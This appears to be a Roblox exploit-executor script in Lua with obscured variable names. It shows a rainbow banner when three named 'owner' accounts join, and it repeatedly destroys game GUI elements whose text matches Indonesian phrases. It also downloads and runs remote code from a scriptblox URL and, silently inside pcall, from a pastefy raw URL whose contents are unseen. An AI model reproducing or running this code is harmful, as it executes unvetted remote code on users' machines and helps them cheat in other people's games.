local _U = {}
local _P = game:GetService("Players")
local _T = game:GetService("TweenService")
local _L = _P.LocalPlayer

pcall(function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Disable-Gameplay-Paused-234775"))()
end)

local _O = { ["HimNotTurbo"] = true, ["Grexsky1"] = true, ["Skiee1s"] = true }

local function _nJ()
    local _tg = (gethui and gethui()) or game:GetService("CoreGui")
    local _ng = Instance.new("ScreenGui")
    _ng.Name = "OwnerJoinedNotif"
    _ng.ResetOnSpawn = false
    _ng.Parent = _tg

    local _f = Instance.new("Frame")
    _f.Size = UDim2.new(0, 350, 0, 45)
    _f.Position = UDim2.new(0.5, -175, 0, -60)
    _f.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    _f.BackgroundTransparency = 0.2
    _f.BorderSizePixel = 2
    _f.BorderColor3 = Color3.fromRGB(255, 215, 0)
    _f.Parent = _ng
    Instance.new("UICorner", _f).CornerRadius = UDim.new(0, 8)

    local _tx = Instance.new("TextLabel")
    _tx.Size = UDim2.new(1, -10, 1, 0)
    _tx.Position = UDim2.new(0, 5, 0, 0)
    _tx.BackgroundTransparency = 1
    _tx.Text = "Owner of this script Has Joined👑 "
    _tx.TextColor3 = Color3.new(1, 1, 1)
    _tx.Font = Enum.Font.GothamBlack
    _tx.TextSize = 16
    _tx.TextXAlignment = Enum.TextXAlignment.Center
    _tx.Parent = _f
    
    local _gr = Instance.new("UIGradient")
    _gr.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
    }
    _gr.Parent = _tx

    _T:Create(_f, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -175, 0, 20)}):Play()

    task.spawn(function()
        local _b = "Owner of this script Has Joined👑    "
        local _i = 1
        while _f.Parent do
            _tx.Text = _b:sub(_i) .. _b:sub(1, _i - 1)
            _gr.Offset = Vector2.new((_gr.Offset.X + 0.05) % 1, 0)
            _i = _i + 1
            if _i > #_b then _i = 1 end
            task.wait(0.08)
        end
    end)

    task.delay(5, function()
        local _tw = _T:Create(_f, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -175, 0, -60)})
        _tw:Play()
        _tw.Completed:Wait()
        _ng:Destroy()
    end)
end

local function _cO(_p)
    if _O[_p.Name] and _p ~= _L then _nJ() end
end

for _, _p in ipairs(_P:GetPlayers()) do _cO(_p) end
_P.PlayerAdded:Connect(_cO)

local _BU = "https://pastefy.app/4xLipsKV/raw"
pcall(function()
    local _sc, _bc = pcall(function() return game:HttpGet(_BU) end)
    if _sc and _bc and #_bc > 0 then
        local _fn = loadstring(_bc)
        if _fn then pcall(_fn) end
    end
end)

local _KP = { "bawa paket", "masih bawa", "tunggu sebentar", "tunggu bentar" }
local function _mN(_t)
    if not _t or _t == "" then return false end
    local _lw = _t:lower()
    for _, _pt in ipairs(_KP) do
        if _lw:find(_pt, 1, true) then return true end
    end
    return false
end

task.spawn(function()
    while true do
        task.wait(0.05)
        local _pg = _L:FindFirstChild("PlayerGui")
        if _pg then
            for _, _v in ipairs(_pg:GetDescendants()) do
                if (_v:IsA("TextLabel") or _v:IsA("TextButton")) and _mN(_v.Text) then
                    local _tg = _v
                    while _tg.Parent and _tg.Parent ~= _pg and _tg.Parent:IsA("GuiObject") do
                        _tg = _tg.Parent
                    end
                    _tg:Destroy()
                end
            end
        end
    end
end)

return _U
